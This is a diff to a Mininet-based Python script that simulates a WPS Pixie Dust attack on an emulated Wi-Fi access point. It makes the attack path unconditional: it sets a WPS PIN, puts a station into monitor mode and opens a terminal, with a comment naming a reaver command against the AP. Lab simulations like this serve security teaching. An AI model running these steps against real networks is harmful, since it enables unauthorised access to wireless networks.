@@ -1,3 +1,4 @@
+from mininet.term import makeTerm
 from mininet.net import Mininet
 from mininet.node import Controller
 from mininet.cli import CLI
@@ -45,16 +46,11 @@ def create_wifi_WPS_Pixie_attack():
     net.build()
     ap1.start([])
 
-    if attack:
-        ap1.cmd('hostapd_cli -i ap1-wlan1 wps_ap_pin set 12345670')
-        sta1.cmd('iw dev sta1-wlan0 interface add mon0 type monitor')
-        sta1.cmd('ip link set mon0 up')
-        makeTerm(sta1)  #reaver -i mon0 -b 02:00:00:00:02:00 -vv
-    else:
-        ap1.cmd('hostapd_cli -i ap1-wlan1 wps_pin any 12345670')
-        sta1.cmd('wpa_cli -i sta1-wlan0 wps_pin 02:00:00:00:02:00 12345670')
-        sta2.cmd('wpa_cli -i sta2-wlan0 wps_pin 02:00:00:00:02:00 12345670')
 
+    ap1.cmd('hostapd_cli -i ap1-wlan1 wps_ap_pin set 12345670')
+    sta1.cmd('iw dev sta1-wlan0 interface add mon0 type monitor')
+    sta1.cmd('ip link set mon0 up')
+    makeTerm(sta1)  #reaver -i mon0 -b 02:00:00:00:02:00 -vv
 
     os.system("clear")
     print_banner()
